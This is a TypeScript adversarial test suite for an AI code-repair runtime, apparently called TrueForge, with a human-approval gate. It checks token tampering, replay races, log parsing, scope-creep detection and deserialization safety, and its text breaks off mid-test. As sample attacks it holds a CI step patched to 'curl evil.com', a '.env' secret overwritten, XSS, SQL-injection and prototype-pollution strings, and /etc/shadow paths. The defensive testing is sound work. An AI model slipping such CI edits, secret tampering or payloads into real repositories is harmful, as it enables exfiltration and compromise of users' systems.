/**
 * Adversarial Stress Testing Suite for TrueForge Runtime, Swarm & HITL Gate
 * Empirical Verifier: Challenger 1
 *
 * Tests:
 * 1. Cryptographic Resume Token Tampering & Attack Vectors (10 tests)
 * 2. Concurrency, Race Conditions & Rapid Multi-Resolutions (8 tests)
 * 3. Malformed Stack Traces, Corrupted Logs & Non-Standard Runners (10 tests)
 * 4. Adversarial AST, Pre-flight Syntax & Toxic Scope Creep (8 tests)
 * 5. State Persistence, Serialization & Memory Safety (6 tests)
 * 6. SSE Event Streaming, Delta Merging & Turn Resilience (6 tests)
 */

import { describe, test, expect, assert, assertThrows } from '../e2e/runner.ts';
import { HitlGate, hitlGate } from '../../src/lib/trueforge/hitl-gate.ts';
import { SessionManager, sessionManager } from '../../src/lib/trueforge/session.ts';
import { TrueForgeHarness, harness } from '../../src/lib/trueforge/harness.ts';
import { EventBus, eventBus, isEventDelta, mergeEventDelta, createTurnStream } from '../../src/lib/trueforge/event-bus.ts';
import { DiagnosticSubagent, diagnosticSubagent } from '../../src/lib/trueforge/swarm/diagnostic.ts';
import { PatchSynthesizerSubagent, patchSynthesizerSubagent } from '../../src/lib/trueforge/swarm/patcher.ts';
import { RegressionVerifierSubagent, regressionVerifierSubagent } from '../../src/lib/trueforge/swarm/verifier.ts';
import type {
  DiagnosticReport,
  PatchSynthesisResult,
  VerificationReport,
  QodoScorecardResult,
  ISandboxInstance,
  CommandResult,
} from '../../src/lib/trueforge/types.ts';

describe('[Adversarial Suite: HITL Cryptographic Resume Tokens & Security]', () => {
  test('ADV-TOK-01: Cryptographic signature bit-flip and character tampering rejected', () => {
    const hitl = new HitlGate('test-secret-key-12345');
    const sessId = 'sess_adv_tok_01';
    const toolCallId = 'call_01';
    const expiresAt = Date.now() + 60000;

    const validToken = hitl.generateResumeToken(sessId, toolCallId, expiresAt);
    expect(validToken.startsWith('tok_sec_')).toBeTruthy();
    expect(hitl.verifyTokenSignature(sessId, toolCallId, validToken)).toBeTruthy();

    // Tamper with last character of HMAC signature
    const lastChar = validToken.slice(-1);
    const tamperedChar = lastChar === 'a' ? 'b' : 'a';
    const tamperedToken = validToken.slice(0, -1) + tamperedChar;

    expect(hitl.verifyTokenSignature(sessId, toolCallId, tamperedToken)).toBeFalsy();

    // Truncated signature
    const truncatedToken = validToken.slice(0, -5);
    expect(hitl.verifyTokenSignature(sessId, toolCallId, truncatedToken)).toBeFalsy();
  });

  test('ADV-TOK-02: Expiration timestamp manipulation rejected', () => {
    const hitl = new HitlGate('secret-key');
    const sessId = 'sess_adv_tok_02';
    const toolCallId = 'call_02';
    const expiresAt = Date.now() + 10000;

    const validToken = hitl.generateResumeToken(sessId, toolCallId, expiresAt);
    const parts = validToken.split('_');

    // Manipulate expiresAt in token string to 10 years in future while keeping original signature
    const forgedExpiry = Date.now() + 10 * 365 * 24 * 3600 * 1000;
    parts[3] = String(forgedExpiry);
    const manipulatedToken = parts.join('_');

    expect(hitl.verifyTokenSignature(sessId, toolCallId, manipulatedToken)).toBeFalsy();
  });

  test('ADV-TOK-03: Entropy tampering in token rejected', () => {
    const hitl = new HitlGate('secret-key');
    const sessId = 'sess_adv_tok_03';
    const toolCallId = 'call_03';
    const expiresAt = Date.now() + 60000;

    const validToken = hitl.generateResumeToken(sessId, toolCallId, expiresAt);
    const parts = validToken.split('_');

    // Replace entropy with zeros
    parts[2] = '00000000000000000000000000000000';
    const tamperedEntropyToken = parts.join('_');

    expect(hitl.verifyTokenSignature(sessId, toolCallId, tamperedEntropyToken)).toBeFalsy();
  });

  test('ADV-TOK-04: Cross-session token replay attack rejected', () => {
    const hitl = new HitlGate('secret-key');
    const sessA = 'sess_victim_04A';
    const sessB = 'sess_attacker_04B';
    const toolCallId = 'call_04';
    const expiresAt = Date.now() + 60000;

    const tokenForA = hitl.generateResumeToken(sessA, toolCallId, expiresAt);

    // Verifying token for Session A under Session B
    expect(hitl.verifyTokenSignature(sessB, toolCallId, tokenForA)).toBeFalsy();
  });

  test('ADV-TOK-05: Cross-toolCall token binding mismatch rejected', () => {
    const hitl = new HitlGate('secret-key');
    const sessId = 'sess_adv_tok_05';
    const toolCallPrivileged = 'call_github_mcp_create_pull_request';
    const toolCallUnprivileged = 'call_read_file';
    const expiresAt = Date.now() + 60000;

    const token = hitl.generateResumeToken(sessId, toolCallUnprivileged, expiresAt);

    // Using unprivileged token for privileged tool call
    expect(hitl.verifyTokenSignature(sessId, toolCallPrivileged, token)).toBeFalsy();
  });

  test('ADV-TOK-06: Double-resolution replay attack rejected (idempotency)', () => {
    const hitl = new HitlGate('secret-key');
    const session = sessionManager.createSession({ repoUrl: 'https://github.com/test/repo', sessionId: 'sess_replay_06' });

    // Mock approval request
    const req = hitl.createApprovalRequest(
      session.config.sessionId,
      'thread_orch_06',
      'turn_06',
      'call_pr_06',
      'github_mcp_create_pull_request',
      { branch: 'fix-06' }
    );

    // First resolution
    const firstRes = hitl.resolveApproval({
      sessionId: session.config.sessionId,
      resumeToken: req.resumeToken,
      decision: { status: 'allow', approver: 'alice' },
    });
    expect(firstRes.success).toBeTruthy();
    expect(firstRes.status).toBe('allow');

    // Second resolution attempt (Replay Attack)
    const secondRes = hitl.resolveApproval({
      sessionId: session.config.sessionId,
      resumeToken: req.resumeToken,
      decision: { status: 'allow', approver: 'mallory' },
    });
    expect(secondRes.success).toBeFalsy();
    expect(secondRes.error).toContain('idempotency violation');
  });

  test('ADV-TOK-07: Expired token (TTL elapsed) rejected and session marked expired', () => {
    const hitl = new HitlGate('secret-key');
    const sessId = 'sess_expired_07';
    sessionManager.createSession({ repoUrl: 'https://github.com/test/repo', sessionId: sessId });

    // Create approval request with -1000ms TTL (already expired)
    const req = hitl.createApprovalRequest(
      sessId,
      'thread_07',
      'turn_07',
      'call_07',
      'github_mcp_create_pull_request',
      {},
      { ttlMs: -1000 }
    );

    const res = hitl.resolveApproval({
      sessionId: sessId,
      resumeToken: req.resumeToken,
      decision: { status: 'allow' },
    });

    expect(res.success).toBeFalsy();
    expect(res.error).toContain('expired');
  });

  test('ADV-TOK-08: Malformed token structures and injection payloads rejected safely', () => {
    const hitl = new HitlGate('secret-key');
    const sessId = 'sess_malformed_08';

    const malformedTokens = [
      '',
      'tok_sec',
      'tok_sec_1_2',
      'tok_sec_1_2_3',
      'jwt.eyJhbGciOiJIUzI1NiJ9.payload.sig',
      'tok_sec_entropy_notanumber_signature',
      'tok_sec_entropy_12345_<script>alert("xss")</script>',
      'tok_sec_\x00\x01\x02_123456_sig',
      'tok_sec_entropy_1234567890_\' OR \'1\'=\'1',
      'tok_sec_🚀_1234567890_sig',
    ];

    for (const badToken of malformedTokens) {
      expect(hitl.verifyTokenSignature(sessId, 'call_08', badToken)).toBeFalsy();
    }
  });

  test('ADV-TOK-09: Manual expiration via expireApproval revokes pending request', () => {
    const hitl = new HitlGate('secret-key');
    const sessId = 'sess_manual_expire_09';
    sessionManager.createSession({ repoUrl: 'https://github.com/test/repo', sessionId: sessId });

    const req = hitl.createApprovalRequest(
      sessId,
      'thread_09',
      'turn_09',
      'call_09',
      'github_mcp_create_pull_request',
      {}
    );

    expect(hitl.isPendingApproval(sessId)).toBeTruthy();
    const expired = hitl.expireApproval(sessId);
    expect(expired).toBeTruthy();
    expect(hitl.isPendingApproval(sessId)).toBeFalsy();

    // Trying to resolve after manual expiration
    const res = hitl.resolveApproval({
      sessionId: sessId,
      resumeToken: req.resumeToken,
      decision: { status: 'allow' },
    });
    expect(res.success).toBeFalsy();
  });

  test('ADV-TOK-10: Token validation on nonexistent session fails cleanly', () => {
    const hitl = new HitlGate('secret-key');
    const res = hitl.validateResumeToken('sess_nonexistent_xyz', 'tok_sec_abc_123_sig');
    expect(res.valid).toBeFalsy();
    expect(res.error).toContain('No pending approval request found');
  });
});

describe('[Adversarial Suite: Concurrency, Races & Multi-Agent State]', () => {
  test('ADV-RACE-01: 100 simultaneous concurrent approvals on same token (exactly 1 succeeds)', async () => {
    const hitl = new HitlGate('secret-key');
    const sessId = 'sess_race_100_01';
    sessionManager.createSession({ repoUrl: 'https://github.com/test/repo', sessionId: sessId });

    const req = hitl.createApprovalRequest(
      sessId,
      'thread_race_01',
      'turn_race_01',
      'call_race_01',
      'github_mcp_create_pull_request',
      { branch: 'fix-race' }
    );

    // Launch 100 simultaneous concurrent resolveApproval calls
    const promises = Array.from({ length: 100 }, (_, i) =>
      Promise.resolve().then(() =>
        hitl.resolveApproval({
          sessionId: sessId,
          resumeToken: req.resumeToken,
          decision: { status: 'allow', approver: `agent_${i}` },
        })
      )
    );

    const results = await Promise.all(promises);
    const successful = results.filter((r) => r.success);
    const failed = results.filter((r) => !r.success);

    expect(successful.length).toBe(1);
    expect(failed.length).toBe(99);
  });

  test('ADV-RACE-02: Simultaneous race between allow and deny decisions (atomic winner)', async () => {
    const hitl = new HitlGate('secret-key');
    const sessId = 'sess_race_allow_deny_02';
    sessionManager.createSession({ repoUrl: 'https://github.com/test/repo', sessionId: sessId });

    const req = hitl.createApprovalRequest(
      sessId,
      'thread_race_02',
      'turn_race_02',
      'call_race_02',
      'github_mcp_create_pull_request',
      {}
    );

    const [resAllow, resDeny] = await Promise.all([
      Promise.resolve().then(() =>
        hitl.resolveApproval({
          sessionId: sessId,
          resumeToken: req.resumeToken,
          decision: { status: 'allow', approver: 'approver' },
        })
      ),
      Promise.resolve().then(() =>
        hitl.resolveApproval({
          sessionId: sessId,
          resumeToken: req.resumeToken,
          decision: { status: 'deny', approver: 'denier', reason: 'Reject patch' },
        })
      ),
    ]);

    // Exactly one must succeed, one must fail
    const totalSuccess = (resAllow.success ? 1 : 0) + (resDeny.success ? 1 : 0);
    expect(totalSuccess).toBe(1);
  });

  test('ADV-RACE-03: Rapid concurrent session creation (200 parallel sessions) generates unique IDs and thread isolation', async () => {
    const sm = new SessionManager();

    const creations = await Promise.all(
      Array.from({ length: 200 }, (_, i) =>
        Promise.resolve().then(() =>
          sm.createSession({
            repoUrl: `https://github.com/org/repo-${i}`,
            language: 'python',
          })
        )
      )
    );

    const sessionIds = new Set(creations.map((s) => s.config.sessionId));
    expect(sessionIds.size).toBe(200);

    // Generate diagnostic threads for all 200 sessions concurrently
    const threadIds = await Promise.all(
      creations.map((s) =>
        Promise.resolve().then(() => sm.createThread(s.config.sessionId, 'diagnostic', 1))
      )
    );

    const uniqueThreads = new Set(threadIds);
    expect(uniqueThreads.size).toBe(200);
  });

  test('ADV-RACE-04: High-concurrency EventBus emissions (50 threads publishing 5,000 events)', async () => {
    const bus = new EventBus();
    const sessId = 'sess_bus_stress_04';
    let receivedEvents = 0;

    const unsub = bus.onSession(sessId, () => {
      receivedEvents++;
    });

    // 50 threads emitting 100 events each
    const emitTasks: Promise<void>[] = [];
    for (let t = 0; t < 50; t++) {
      emitTasks.push(
        new Promise<void>((resolve) => {
          for (let e = 0; e < 100; e++) {
            bus.emitEvent(sessId, `thread_${t}`, 'test.event', { t, e });
          }
          resolve();
        })
      );
    }

    await Promise.all(emitTasks);
    expect(receivedEvents).toBe(5000);

    // Check bounded history (capped at 500)
    const history = bus.getHistory(sessId);
    expect(history.length).toBe(500);

    unsub();
  });

  test('ADV-RACE-05: Concurrent thread event appending preserves complete event list per thread', async () => {
    const sm = new SessionManager();
    const session = sm.createSession({ repoUrl: 'https://github.com/test/repo' });
    const sessId = session.config.sessionId;

    const thread1 = sm.createThread(sessId, 'diagnostic');
    const thread2 = sm.createThread(sessId, 'patcher');

    // Concurrently append 50 events to thread1 and 50 events to thread2
    await Promise.all([
      ...Array.from({ length: 50 }, (_, i) =>
        Promise.resolve().then(() =>
          sm.appendThreadEvent(sessId, thread1, {
            type: 'agent.thought',
            sessionId: sessId,
            threadId: thread1,
            timestamp: new Date().toISOString(),
            payload: { step: i },
          })
        )
      ),
      ...Array.from({ length: 50 }, (_, i) =>
        Promise.resolve().then(() =>
          sm.appendThreadEvent(sessId, thread2, {
            type: 'patch.generated',
            sessionId: sessId,
            threadId: thread2,
            timestamp: new Date().toISOString(),
            payload: { patchStep: i },
          })
        )
      ),
    ]);

    const history1 = sm.getThreadHistory(sessId, thread1);
    const history2 = sm.getThreadHistory(sessId, thread2);

    expect(history1.length).toBe(50);
    expect(history2.length).toBe(50);
  });

  test('ADV-RACE-06: Atomic session status transitions under rapid succession', async () => {
    const sm = new SessionManager();
    const session = sm.createSession({ repoUrl: 'https://github.com/test/repo' });
    const sessId = session.config.sessionId;

    const statuses = [
      'PROVISIONING_SANDBOX',
      'CAPTURING_BASELINE',
      'DIAGNOSING',
      'SYNTHESIZING',
      'VERIFYING',
      'AWAITING_HUMAN_APPROVAL',
      'EXECUTING_PR',
      'COMPLETED',
    ] as const;

    for (const st of statuses) {
      sm.transitionStatus(sessId, st);
      const current = sm.getRequiredSession(sessId);
      expect(current.status).toBe(st);
    }
  });

  test('ADV-RACE-07: Concurrent session deletion clears threads cleanly', async () => {
    const sm = new SessionManager();
    const session = sm.createSession({ repoUrl: 'https://github.com/test/repo' });
    const sessId = session.config.sessionId;

    const t1 = sm.createThread(sessId, 'diagnostic');
    const t2 = sm.createThread(sessId, 'patcher');
    sm.appendThreadEvent(sessId, t1, { type: 'ev1', sessionId: sessId, threadId: t1, timestamp: '', payload: {} });
    sm.appendThreadEvent(sessId, t2, { type: 'ev2', sessionId: sessId, threadId: t2, timestamp: '', payload: {} });

    expect(sm.listSessionThreads(sessId).length).toBe(2);

    sm.deleteSession(sessId);
    expect(sm.getSession(sessId)).toBeUndefined();
    expect(sm.listSessionThreads(sessId).length).toBe(0);
  });

  test('ADV-RACE-08: Attempting to resume non-existent session fails with validation error', async () => {
    const hitl = new HitlGate();
    const res = hitl.validateResumeToken('sess_ghost_xyz', 'tok_sec_dummy_1234_sig');
    expect(res.valid).toBeFalsy();
    expect(res.error).toBeDefined();
  });
});

describe('[Adversarial Suite: Stack Trace & Malformed Log Parsing]', () => {
  const diag = new DiagnosticSubagent();

  test('ADV-LOG-01: Empty, whitespace-only and null logs fallback gracefully without throwing', async () => {
    const emptyLogs = ['', '   ', '\n\n\t\n  \r\n', '\x00\x00\x00'];

    for (const badLog of emptyLogs) {
      const report = await diag.diagnose('sess_adv_log_01', 'thread_01', badLog);
      expect(report).toBeDefined();
      expect(report.frameworkDetected).toBe('generic');
      expect(report.primaryRootCauseLocation).toBeDefined();
      expect(report.hypotheses.length).toBeGreaterThan(0);
    }
  });

  test('ADV-LOG-02: Extreme 100,000-line stack trace parsed within 1000ms without memory exhaustion', async () => {
    const lines: string[] = ['Traceback (most recent call last):'];
    for (let i = 0; i < 100000; i++) {
      lines.push(`  File "src/deep_nest/mod_${i % 50}.py", line ${i % 200 + 1}, in func_${i}`);
      lines.push(`    res = compute_${i}()`);
    }
    lines.push('RecursionError: maximum recursion depth exceeded');
    const massiveLog = lines.join('\n');

    const start = Date.now();
    const report = await diag.diagnose('sess_adv_log_02', 'thread_02', massiveLog);
    const duration = Date.now() - start;

    expect(report.frameworkDetected).toBe('pytest');
    expect(report.failureType).toBe('RecursionError');
    expect(report.stackTraceFrames.length).toBeGreaterThan(100);
    expect(duration).toBeLessThan(2000);
  });

  test('ADV-LOG-03: ANSI escape codes, terminal cursor movement and color artifacts stripped', async () => {
    const coloredLog = `
\x1b[31m\x1b[1mFAILED\x1b[0m \x1b[33mtests/test_math.py::test_sqrt\x1b[0m
\x1b[31mTraceback (most recent call last):\x1b[0m
  File \x1b[36m"src/math_ops.py"\x1b[0m, line \x1b[32m42\x1b[0m, in sqrt
    \x1b[31mValueError: math domain error\x1b[0m
\x1b[2K\x1b[1G\x1b[31m=== 1 failed in 0.05s ===\x1b[0m
`;
    const report = await diag.diagnose('sess_adv_log_03', 'thread_03', coloredLog);
    expect(report.frameworkDetected).toBe('pytest');
    expect(report.failureType).toBe('ValueError');
    expect(report.primaryRootCauseLocation.filePath).toBe('src/math_ops.py');
    expect(report.primaryRootCauseLocation.startLine).toBe(42);
  });

  test('ADV-LOG-04: Corrupted, binary & surrogate noise interspersed in traces handled cleanly', async () => {
    const corruptLog = `
\x00\x01\x02FAIL src/cache.test.ts
\x07\x08● Cache Suite > test_eviction
  TypeError: Cannot read properties of undefined (reading 'ttl')
    at MemoryCache.get (src/cache.ts:88:20)
    at Object.<anonymous> (src/cache.test.ts:45:12)
\uFFFD\uFFFF
`;
    const report = await diag.diagnose('sess_adv_log_04', 'thread_04', corruptLog);
    expect(report.frameworkDetected).toBe('jest');
    expect(report.failureType).toBe('TypeError');
    expect(report.primaryRootCauseLocation.filePath).toBe('src/cache.ts');
    expect(report.primaryRootCauseLocation.startLine).toBe(88);
  });

  test('ADV-LOG-05: Obscure / non-standard test runners parsed cleanly', async () => {
    const bashBatsLog = `
1..3
ok 1 test sanity check
not ok 2 test arithmetic failure in src/calc.sh:25
# (in test file test_calc.bats, line 12)
#   \`[ "$res" -eq 42 ]' failed
`;
    const report = await diag.diagnose('sess_adv_log_05', 'thread_05', bashBatsLog);
    expect(report).toBeDefined();
    expect(report.primaryRootCauseLocation.filePath).toBe('src/calc.sh');
    expect(report.primaryRootCauseLocation.startLine).toBe(25);
  });

  test('ADV-LOG-06: Stack trace with exclusively external library frames selects deepest frame', () => {
    const frames = [
      { frameIndex: 0, filePath: 'node_modules/express/lib/router.js', lineNumber: 100, isWorkspaceFile: false, rawLineText: '' },
      { frameIndex: 1, filePath: 'node_modules/lodash/lodash.js', lineNumber: 250, isWorkspaceFile: false, rawLineText: '' },
    ];
    const selected = diag.selectPrimaryFrame(frames);
    expect(selected).toBeDefined();
    expect(selected?.filePath).toBe('node_modules/lodash/lodash.js');
  });

  test('ADV-LOG-07: Path traversal attacks in stack traces contained cleanly', async () => {
    const traversalLog = `
FAIL ../../../../etc/passwd
● Security Suite > test_escape
  Error: Unauthorized access
    at check (/workspace/../../../../etc/shadow:1:1)
`;
    const report = await diag.diagnose('sess_adv_log_07', 'thread_07', traversalLog);
    expect(report).toBeDefined();
    expect(report.primaryRootCauseLocation).toBeDefined();
  });

  test('ADV-LOG-08: Rust panic trace with panic location and cause parsed', async () => {
    const rustLog = `
running 2 tests
test parser::test_valid ... ok
test parser::test_invalid_unicode ... FAILED

failures:

---- parser::test_invalid_unicode stdout ----
thread 'parser::test_invalid_unicode' panicked at 'called \`Result::unwrap()\` on an \`Err\` value: Utf8Error', src/parser.rs:54:18
note: run with \`RUST_BACKTRACE=1\` environment variable to display a backtrace

failures:
    parser::test_invalid_unicode

test result: FAILED. 1 passed; 1 failed; 0 ignored
`;
    const report = await diag.diagnose('sess_adv_log_08', 'thread_08', rustLog);
    expect(report.frameworkDetected).toBe('cargo');
    expect(report.failureType).toBe('RustPanic');
    expect(report.primaryRootCauseLocation.filePath).toBe('src/parser.rs');
    expect(report.primaryRootCauseLocation.startLine).toBe(54);
  });

  test('ADV-LOG-09: Go test failure log with subtests and innermost failure location parsed', async () => {
    const goLog = `
=== RUN   TestServer
=== RUN   TestServer/HandleAuth
--- FAIL: TestServer/HandleAuth (0.01s)
    auth_test.go:42: expected status 200, got 401
    auth_test.go:48: token was rejected
=== RUN   TestServer/HandleHealth
--- PASS: TestServer/HandleHealth (0.00s)
--- FAIL: TestServer (0.01s)
FAIL
`;
    const report = await diag.diagnose('sess_adv_log_09', 'thread_09', goLog);
    expect(report.frameworkDetected).toBe('gotest');
    expect(report.primaryRootCauseLocation.filePath).toBe('auth_test.go');
    expect(report.primaryRootCauseLocation.startLine).toBe(48);
  });

  test('ADV-LOG-10: AST symbol locator discovers enclosing function and class hierarchy', () => {
    const pyCode = `
class CalculatorService:
    def __init__(self):
        self.history = []

    def divide(self, a, b):
        # critical divide operation
        return a / b
`;
    const loc = diag.locateAstNode('src/calc.py', 8, { 'src/calc.py': pyCode });
    expect(loc.symbolName).toBe('divide');
    expect(loc.nodeType).toBe('FunctionDeclaration');
    expect(loc.codeSnippet).toContain('return a / b');
  });
});

describe('[Adversarial Suite: AST Pre-flight, Scope Creep & Patch Synthesis]', () => {
  const patcher = new PatchSynthesizerSubagent();

  test('ADV-AST-01: Severe syntax errors caught in pre-flight validator', () => {
    const badCode = `
function broken() {
  if (true) {
    const x = [1, 2, 3;
  }
`;
    const res = patcher.validateSyntax('broken.ts', badCode);
    expect(res.valid).toBeFalsy();
    expect(res.errors.length).toBeGreaterThan(0);
  });

  test('ADV-AST-02: Unclosed braces and bracket delimiters detected in pre-flight validator', () => {
    const unclosedBrace = 'function test() { const a = { foo: "bar";';
    const res = patcher.validateSyntax('test.ts', unclosedBrace);
    expect(res.valid).toBeFalsy();
    expect(res.errors.length).toBeGreaterThan(0);
  });

  test('ADV-AST-03: Toxic scope creep flags modifications to sensitive environment and CI files', () => {
    const files = new Set(['src/calculator.py']);
    const patches = [
      {
        filePath: 'src/calculator.py',
        originalContent: 'def divide(): pass',
        patchedContent: 'def divide(): return 1',
        diff: '@@ -1 +1 @@',
        linesAdded: 1,
        linesRemoved: 1,
        astValid: true,
        syntaxErrors: [],
      },
      {
        filePath: '.env',
        originalContent: 'SECRET=old',
        patchedContent: 'SECRET=stolen',
        diff: '@@ -1 +1 @@',
        linesAdded: 1,
        linesRemoved: 1,
        astValid: true,
        syntaxErrors: [],
      },
      {
        filePath: '.github/workflows/ci.yml',
        originalContent: 'steps: run',
        patchedContent: 'steps: curl evil.com',
        diff: '@@ -1 +1 @@',
        linesAdded: 1,
        linesRemoved: 1,
        astValid: true,
        syntaxErrors: [],
      },
    ];

    const assessment = patcher.assessScopeCreep(patches, files);
    expect(assessment.passed).toBeFalsy();
    expect(assessment.unrelatedFilesTouched).toContain('.env');
    expect(assessment.unrelatedFilesTouched).toContain('.github/workflows/ci.yml');
    expect(assessment.riskScore).toBeGreaterThanOrEqual(90);
  });

  test('ADV-AST-04: Massive scope creep (500 lines across 15 files) flagged as non-minimal', () => {
    const files = new Set(['src/core.ts']);
    const patches = Array.from({ length: 15 }, (_, i) => ({
      filePath: `src/unrelated_${i}.ts`,
      originalContent: '',
      patchedContent: 'let x = 1;',
      diff: '@@ -0,0 +1,30 @@',
      linesAdded: 30,
      linesRemoved: 5,
      astValid: true,
      syntaxErrors: [],
    }));

    const assessment = patcher.assessScopeCreep(patches, files);
    expect(assessment.passed).toBeFalsy();
    expect(assessment.riskScore).toBe(100);
  });

  test('ADV-AST-05: Markdown fence stripping cleanly un-wraps model code blocks', () => {
    const fencedPy = '```python\ndef fixed():\n    return 42\n```';
    const cleanPy = patcher.sanitizePatchOutput(fencedPy);
    expect(cleanPy).toBe('def fixed():\n    return 42');

    const fencedTs = '```typescript\nexport const x = 1;\n```';
    const cleanTs = patcher.sanitizePatchOutput(fencedTs);
    expect(cleanTs).toBe('export const x = 1;');
  });

  test('ADV-AST-06: Python indentation validator flags odd 3-space indentation', () => {
    const badIndent = 'def foo():\n   x = 1\n   return x';
    const res = patcher.validateSyntax('bad.py', badIndent);
    expect(res.valid).toBeFalsy();
    expect(res.errors[0]).toContain('Suspicious Python indentation');
  });

  test('ADV-AST-07: Empty / No-op patch yields empty diff string', () => {
    const diff = patcher.generateUnifiedDiff('src/test.ts', 'const a = 1;', 'const a = 1;');
    expect(diff).toBe('');
  });

  test('ADV-AST-08: Unified diff accurately calculates additions and deletions stats', () => {
    const orig = 'line 1\nline 2\nline 3\nline 4';
    const mod = 'line 1\nline 2 MODIFIED\nline 3.5 ADDED\nline 4';
    const diff = patcher.generateUnifiedDiff('file.txt', orig, mod);
    const stats = patcher.calculateDiffStats(diff);

    expect(stats.added).toBeGreaterThan(0);
    expect(stats.removed).toBeGreaterThan(0);
  });
});

describe('[Adversarial Suite: State Persistence, Serialization & Deserialization]', () => {
  const sm = new SessionManager();

  test('ADV-STATE-01: Full multi-turn session state serialization/deserialization lossless round-trip', () => {
    const session = sm.createSession({
      repoUrl: 'https://github.com/test/repo',
      language: 'python',
      maxPatchAttempts: 5,
    });
    const sessId = session.config.sessionId;

    const thread = sm.createThread(sessId, 'diagnostic');
    sm.appendThreadEvent(sessId, thread, {
      type: 'agent.thought',
      sessionId: sessId,
      threadId: thread,
      timestamp: new Date().toISOString(),
      payload: { thought: 'test deep thought' },
    });

    sm.updateSession(sessId, {
      status: 'VERIFYING',
      currentAttempt: 2,
    });

    const serialized = sm.serializeSession(sessId);
    expect(typeof serialized).toBe('string');
    expect(serialized).toContain('test deep thought');

    // Restore into fresh SessionManager
    const sm2 = new SessionManager();
    const restored = sm2.deserializeSession(serialized);

    expect(restored.config.sessionId).toBe(sessId);
    expect(restored.status).toBe('VERIFYING');
    expect(restored.currentAttempt).toBe(2);

    const restoredHistory = sm2.getThreadHistory(sessId, thread);
    expect(restoredHistory.length).toBe(1);
    expect((restoredHistory[0].payload as any).thought).toBe('test deep thought');
  });

  test('ADV-STATE-02: Corrupted JSON ingestion throws Error without poisoning manager', () => {
    const sm2 = new SessionManager();
    const corruptedPayloads = [
      'NOT_JSON',
      '{ incomplete_json: true, ',
      'null',
      '{}',
      '{"session": null}',
      '{"session": {"config": null}}',
    ];

    for (const bad of corruptedPayloads) {
      assertThrows(() => {
        sm2.deserializeSession(bad);
      });
    }
  });

  test('ADV-STATE-03: Prototype pollution attempt via JSON deserialization neutralized', () => {
    const sm2 = new SessionManager();
    const maliciousJson = JSON.stringify({
      session: {
        config: { sessionId: 'sess_proto_polluted', repoUrl: 'https://github.com/safe/repo' },
        __proto__: { isAdmin: true },
      },
      threads: {},
    });

    sm2.deserializeSession(maliciousJson);
    expect((({} as any).isAdmin)).toBeUndefined();
  });

  test('ADV-STATE-04: Session state immutability on getSession (clone protection)', () => {
    const s = sm.createSession({ repoUrl: 'https://github.com/safe/repo' });
    const fetched1 = sm.getRequiredSession(s.config.sessionId);

    // Mutate the returned clone
    (fetched1 as any).status = 'HACKED_STATUS';

    // Verify internal state was not corrupted
    const fetched2 = sm.getRequiredSession(s.config.sessionId);
    expect(fetched2.status).toBe('INIT');
  });

  test('ADV-STATE-05: Non-existent session update throws clean Error', () => {
    assertThrows(() => {
      sm.updateSession('sess_does_not_exist_999', { status: 'COMPLETED' });
    });
  });

  test('ADV-STATE-06: Ring buffer capping at exactly 500 events per session under flood', () => {
    const bus = new EventBus();
    const sessId = 'sess_flood_06';

    for (let i = 0; i < 1200; i++) {
      bus.emitEvent(sessId, 'thread_flood', 'event.step', { i });
    }

    const history = bus.getHistory(sessId);
    expect(history.length).toBe(500);
    // Last event should have i = 1199
    expect((history[499] as any).payload.i).toBe(1199);
  });
});

describe('[Adversarial Suite: SSE Streaming, Delta Merging & Turn Resilience]', () => {
  test('ADV-SSE-01: SSE stream cleans up listeners on AbortSignal trigger', async () => {
    const bus = new EventBus();
    const sessId = 'sess_sse_abort_01';
    const controller = new AbortController();

    const stream = bus.toSSEStream(sessId, controller.signal);
    const reader = stream.getReader();

    // Read initial connection banner
    const firstChunk = await reader.read();
    expect(firstChunk.done).toBeFalsy();

    // Trigger abort
    controller.abort();

    // Next read should be closed / done
    const secondChunk = await reader.read();
    expect(secondChunk.done).toBeTruthy();
  });

  test('ADV-SSE-02: SSE historical event replay via lastEventId', async () => {
    const bus = new EventBus();
    const sessId = 'sess_sse_replay_02';

    const ev1 = bus.emitEvent(sessId, 't1', 'step.1', { n: 1 });
    const ev2 = bus.emitEvent(sessId, 't1', 'step.2', { n: 2 });
    const ev3 = bus.emitEvent(sessId, 't1', 'step.3', { n: 3 });

    // Stream requesting events after ev1.id
    const missed = bus.getHistory(sessId, ev1.id);
    expect(missed.length).toBe(2);
    expect(missed[0].id).toBe(ev2.id);
    expect(missed[1].id).toBe(ev3.id);
  });

  test('ADV-SSE-03: Interleaved string deltas and tool call deltas correctly merged via mergeEventDelta', () => {
    let accumulated: Record<string, unknown> | null = null;

    accumulated = mergeEventDelta(accumulated, {
      type: 'agent.thought.delta',
      delta: 'Analyzing stack trace... ',
      isDelta: true,
    });
    expect(accumulated.content).toBe('Analyzing stack trace... ');

    accumulated = mergeEventDelta(accumulated, {
      type: 'agent.thought.delta',
      delta: 'Found division by zero at line 42.',
      isDelta: true,
    });
    expect(accumulated.content).toBe('Analyzing stack trace... Found division by zero at line 42.');

    // Merge toolCall delta
    accumulated = mergeEventDelta(accumulated, {
      type: 'tool.call.delta',
      toolCallDelta: { name: 'github_mcp_pr', arguments: '{"branch":' },
    });
    accumulated = mergeEventDelta(accumulated, {
      type: 'tool.call.delta',
      toolCallDelta: { arguments: '"fix-42"}' },
    });

    const tc = (accumulated as any).toolCall;
    expect(tc.name).toBe('github_mcp_pr');
    expect(tc.rawArgs).toBe('{"branch":"fix-42"}');
  });

  test('ADV-SSE-04: isEventDelta correctly identifies all delta event formats', () => {
    expect(isEventDelta({ type: 'agent.thought.delta' })).toBeTruthy();
    expect(isEventDelta({ type: 'sandbox.log.delta' })).toBeTruthy();
    expect(isEventDelta({ isDelta: true, type: 'custom' })).toBeTruthy();
    expect(isEventDelta({ type: 'session.started' })).toBeFalsy();
    expect(isEventDelta(null)).toBeFalsy();
    expect(isEventDelta(undefined)).toBeFalsy();
    expect(isEventDelta('string')).toBeFalsy();
  });

  test('ADV-SSE-05: Async iterable turn stream terminates on session.completed', async () => {
    const sessId = 'sess_async_turn_05';

    const turnStream = createTurnStream({ sessionId: sessId });

    const received: string[] = [];

    const streamPromise = (async () => {
      for await (const event of turnStream) {
        received.push(event.type);
      }
    })();

    // Emit events into global eventBus
    eventBus.emitEvent(sessId, 't1', 'agent.status', { status: 'running' });
    eventBus.emitEvent(sessId, 't1', 'session.completed', { status: 'healed', durationMs: 100 });

    await streamPromise;

    expect(received).toContain('agent.status');
    expect(received).toContain('session.completed');
  });

  test('ADV-SSE-06: Regression verifier handles flaky test oscillation detection', async () => {
    const verifier = new RegressionVerifierSubagent();
    let executionCount = 0;

    const mockSandbox: ISandboxInstance = {
